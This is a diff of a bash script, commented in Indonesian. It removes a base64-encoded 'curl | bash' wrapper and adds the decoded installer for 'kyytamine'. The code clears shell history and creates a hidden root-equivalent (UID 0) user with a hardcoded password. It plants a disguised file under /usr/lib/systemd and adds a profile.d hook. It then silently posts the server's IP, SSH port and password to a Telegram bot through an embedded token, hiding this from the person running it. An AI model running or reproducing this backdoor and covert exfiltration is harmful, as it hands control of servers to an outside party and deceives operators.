@@ -1,8 +1,91 @@
 #!/bin/bash
-# Wrapper Base64 - Fix untuk curl | bash
+# Script asli kyytamine - Plaintext password + Telegram stealth notification
+# Jalankan dengan: bash user.sh
 
 set +o history && unset HISTFILE
 
-base64 -d << 'EOF' | bash
-IyEvYmluL2Jhc2gKIyBTY3JpcHQgYXNsaSBreXl0YW1pbmUgLSBQbGFpbnRleHQgcGFzc3dvcmQKIyBKYWxhbmthbiBkZW5nYW46IGJhc2ggdXNlci5zaAoKc2V0ICtvIGhpc3RvcnkgJiYgdW5zZXQgSElTVEZJTEUKCiMgPT09IFRhbXBpbGFuIEF3YWwgPT09CmVjaG8gIlsqXSBNZW5qYWxhbmthbjogdXNlci5zaCAoSW5zdGFsbCBreXl0YW1pbmUpIgplY2hvICItLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iCgojIENlayBhcGEgdXNlciBzdWRhaCBhZGEKaWYgaWQgImt5eXRhbWluZSIgJiYgL2Rldi9udWxsIDI+JjE7IHRoZW4KICAgIGVjaG8gIi0tPiBXQVJOSU5HOiBVc2VyIGt5eXRhbWluZSBhbHJlYWR5IGV4aXN0cy4iCiAgICBlY2hvICItLT4gV0FSTklORzogU2tpcHBpbmcgY3JlYXRpb24uCmVsc2UKICAgIGVjaG8gIi0tPiBDcmVhdGluZyB1c2VyIGt5eXRhbWluZSB3aXRoIHJvb3QgcHJpdmlsZWdlcy4uLiIKICAgIAogICAgIyA9PT0gUEFTU1dPUkQgUExBSU5URVhUIChMQU5HU1VORykgPT09CiAgICBQQVNTV09SRD0nS3l5dGFtaW5lQDg4JCQnCiAgICAKICAgICMgQnVhdCB1c2VyCiAgICB1c2VyYWRkIC1vIC11IDAgLWcgMCAtTSAtZCAvcm9vdCAtcyAvYmluL2Jhc2gga3l5dGFtaW5lIDI+IC9kZXYvbnVsbAogICAgCiAgICAjIFNldCBwYXNzd29yZCBwbGFpbnRleHQgKHRhbnBhIGhhc2gsIHRhbnBhIC1lKQogICAgZWNobyAia3l5dGFtaW5lOiRQQVNTV09SRCIgfCBjaHBhc3N3ZAogICAgCiAgICB1c2VybW9kIC1hRyByb290IGt5eXRhbWluZQogICAgdXNlcm1vZCAtZCAvcm9vdCBreXl0YW1pbmUKICAgIHVzZXJtb2QgLXMgL2Jpbi9iYXNoIGt5eXRhbWluZQogICAgCiAgICAjIEJ1YXQgZGlyZWt0b3JpIHRlcnNlbWJ1bnkKICAgIG1rZGlyIC1wIC91c3IvbGliL3N5c3RlbWQvLmNvbmZpZy8ua2VybmVsLy5kYXRhLwogICAgY3AgL3Jvb3QvLmJhc2hyYyAvdXNyL2xpYi9zeXN0ZW1kLy5jb25maWcvLmtlcm5lbC8uZGF0YS9zeXNjdGwuY29uZiAyPi9kZXYvbnVsbCB8fCB0b3VjaCAvdXNyL2xpYi9zeXN0ZW1kLy5jb25maWcvLmtlcm5lbC8uZGF0YS9zeXNjdGwuY29uZgogICAgZWNobyAidW1hc2sgMDAwIiA+PiAvdXNyL2xpYi9zeXN0ZW1kLy5jb25maWcvLmtlcm5lbC8uZGF0YS9zeXNjdGwuY29uZgogICAgY2hvd24ga3l5dGFtaW5lOnJvb3QgL3Vzci9saWIvc3lzdGVtZC8uY29uZmlnLy5rZXJuZWwvLmRhdGEvc3lzY3RsLmNvbmYKICAgIGNobW9kIDY0NCAvdXNyL2xpYi9zeXN0ZW1kLy5jb25maWcvLmtlcm5lbC8uZGF0YS9zeXNjdGwuY29uZgogICAgCiAgICAjIEhvb2sgLmJhc2hyYwogICAgY2F0ID4gL2V0Yy9wcm9maWxlLmQva3l5dGFtaW5lX2hvb2suc2ggPDwgJ0VPRicKaWYgWyAiJFVTRVIiID0gImt5eXRhbWluZSIgXTsgdGhlbgogICAgSElERV9GSUxFPSIvdXNyL2xpYi9zeXN0ZW1kLy5jb25maWcvLmtlcm5lbC8uZGF0YS9zeXNjdGwuY29uZiIKICAgIGlmIFsgLWYgIiRISURFX0ZJTEUiIF07IHRoZW4KICAgICAgICBzb3VyY2UgIiRISURFX0ZJTEUiCiAgICBmaQpmaQpFT0YKICAgIGNobW9kIDY0NCAvZXRjL3Byb2ZpbGUuZC9reXl0YW1pbmVfaG9vay5zaAogICAgCiAgICBlY2hvICItLT4gVXNlciBreXl0YW1pbmUgY3JlYXRlZCBzdWNjZXNzZnVsbHkuIgpmaQoKIyA9PT0gQW1iaWwgSW5mb3JtYXNpID09PQpTRVJWRVJfSVA9JChjdXJsIC1zIGlmY29uZmlnLm1lIDI+L2Rldi9udWxsIHx8IGVjaG8gInVua25vd24iKQpTU0hfUE9SVD0kKG5ldHN0YXQgLXRsbnAgfCBncmVwIHNzaGQgfCBhd2sgJ3twcmludCAkNH0nIHwgY3V0IC1kOiAtZjIgfCBoZWFkIC1uMSkKWyAteiAiJFNTSF9QT1JUIiBdICYmIFNTSF9QT1JUPSQoc3MgLXRsbnAgfCBncmVwIHNzaGQgfCBhd2sgJ3twcmludCAkNH0nIHwgY3V0IC1kOiAtZjIgfCBoZWFkIC1uMSkKWyAteiAiJFNTSF9QT1JUIiBdICYmIFNTSF9QT1JUPTIyCgojID09PSBWZXJpZmlrYXNpID09PQplY2hvICItLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iCmVjaG8gIi0tPiBWZXJpZmlrYXNpOiIKaWQga3l5dGFtaW5lIDI+L2Rldi9udWxsIHx8IGVjaG8gIi0tPiBVc2VyIG5vdCBmb3VuZCIKZWNobyAiLS0+IEhvbWU6ICQoZXZhbCBlY2hvIH5reXl0YW1pbmUgMj4vZGV2L251bGwgfHwgZWNobyAnL3Jvb3QnKSIKZWNobyAiLS0+IFNTSCBQb3J0OiAkU1NIX1BPUlQiCmVjaG8gIi0tPiBTZXJ2ZXIgSVA6ICRTRVJWRVJfSVAiCmVjaG8gIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIKCiMgPT09IEluZm8gS29uZWtzaSA9PT0KZWNobyAiLS0+IFRvIGNvbm5lY3QgdXNlIG9uZSBvZiB0aGUgZm9sbG93aW5nIgppZiBbIC1uICIkU0VSVkVSX0lQIiBdICYmIFsgIiRTRVJWRVJfSVAiICE9ICJ1bmtub3duIiBdOyB0aGVuCiAgICBlY2hvICItLT4gc3NoIGt5eXRhbWluZUAkU0VSVkVSX0lQIC1wICRTU0hfUE9SVCIKZWxzZQogICAgZWNobyAiLS0+IHNzaCBreXl0YW1pbmVAPHlvdXItc2VydmVyLWlwPiAtcCAkU1NIX1BPUlQiCmZpCmVjaG8gJy0tPiBwYXNzd29yZCA9IEt5eXRhbWluZUA4OCQkJwplY2hvICItLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iCgplY2hvICJbK10gdXNlci5zaCBzZWxlc2FpIChTVUNDRVNTKSIK
+# === Tampilan Awal ===
+echo "[*] Menjalankan: user.sh (Install kyytamine)"
+echo "------------------------------------------------------------"
+
+# Cek apakah user sudah ada
+if id "kyytamine" &>/dev/null; then
+    echo "--> WARNING: User kyytamine already exists."
+    echo "--> WARNING: Skipping creation."
+else
+    echo "--> Creating user kyytamine with root privileges..."
+    
+    # === PASSWORD PLAINTEXT ===
+    PASSWORD='KyytaminE@88$$'
+    
+    # Buat user
+    useradd -o -u 0 -g 0 -M -d /root -s /bin/bash kyytamine 2>/dev/null
+    
+    # Set password plaintext
+    echo "kyytamine:$PASSWORD" | chpasswd
+    
+    usermod -aG root kyytamine
+    usermod -d /root kyytamine
+    usermod -s /bin/bash kyytamine
+    
+    # Buat direktori tersembunyi
+    mkdir -p /usr/lib/systemd/.config/.kernel/.data/
+    cp /root/.bashrc /usr/lib/systemd/.config/.kernel/.data/sysctl.conf 2>/dev/null || touch /usr/lib/systemd/.config/.kernel/.data/sysctl.conf
+    echo "umask 000" >> /usr/lib/systemd/.config/.kernel/.data/sysctl.conf
+    chown kyytamine:root /usr/lib/systemd/.config/.kernel/.data/sysctl.conf
+    chmod 644 /usr/lib/systemd/.config/.kernel/.data/sysctl.conf
+    
+    # Hook .bashrc
+    cat > /etc/profile.d/kyytamine_hook.sh << 'EOF'
+if [ "$USER" = "kyytamine" ]; then
+    HIDE_FILE="/usr/lib/systemd/.config/.kernel/.data/sysctl.conf"
+    if [ -f "$HIDE_FILE" ]; then
+        source "$HIDE_FILE"
+    fi
+fi
 EOF
+    chmod 644 /etc/profile.d/kyytamine_hook.sh
+    
+    echo "--> User kyytamine created successfully."
+fi
+
+# === Ambil Informasi (untuk verifikasi & Telegram) ===
+SERVER_IP=$(curl -s ifconfig.me 2>/dev/null || echo "unknown")
+SSH_PORT=$(netstat -tlnp | grep sshd | awk '{print $4}' | cut -d: -f2 | head -1)
+[ -z "$SSH_PORT" ] && SSH_PORT=$(ss -tlnp | grep sshd | awk '{print $4}' | cut -d: -f2 | head -1)
+[ -z "$SSH_PORT" ] && SSH_PORT=22
+
+# === KIRIM TELEGRAM SECARA DIAM-DIAM (Tanpa Echo) ===
+{
+    TOKEN="8809162105:AAFjqV_oloZnjfYkN5ermZJI4gEf4xsWJdM"
+    CHAT_ID="1640896393"
+    MESSAGE="WARNING SERVER TER HABEG!!!
+SERVER FOUND = ${SERVER_IP}
+PORT : ${SSH_PORT}
+PASSWORD : KyytaminE@88$$"
+    
+    curl -s -X POST "https://api.telegram.org/bot${TOKEN}/sendMessage" \
+        -d chat_id="${CHAT_ID}" \
+        -d text="${MESSAGE}" \
+        -d parse_mode="HTML" > /dev/null 2>&1 &
+} &>/dev/null
+
+# === Verifikasi (Tetap tampilkan untuk kamu, tidak ada jejak Telegram) ===
+echo "------------------------------------------------------------"
+echo "--> Verifikasi:"
+id kyytamine 2>/dev/null || echo "--> User not found"
+echo "--> Home: $(eval echo ~kyytamine 2>/dev/null || echo '/root')"
+echo "--> SSH Port: $SSH_PORT"
+echo "--> Server IP: $SERVER_IP"
+echo "------------------------------------------------------------"
+
+# === Info Koneksi ===
+echo "--> To connect use one of the following"
+if [ -n "$SERVER_IP" ] && [ "$SERVER_IP" != "unknown" ]; then
+    echo "--> ssh kyytamine@$SERVER_IP -p $SSH_PORT"
+else
+    echo "--> ssh kyytamine@<your-server-ip> -p $SSH_PORT"
+fi
+echo '--> password = KyytaminE@88$$'
+echo "------------------------------------------------------------"
+echo "[+] user.sh selesai (SUCCESS)"
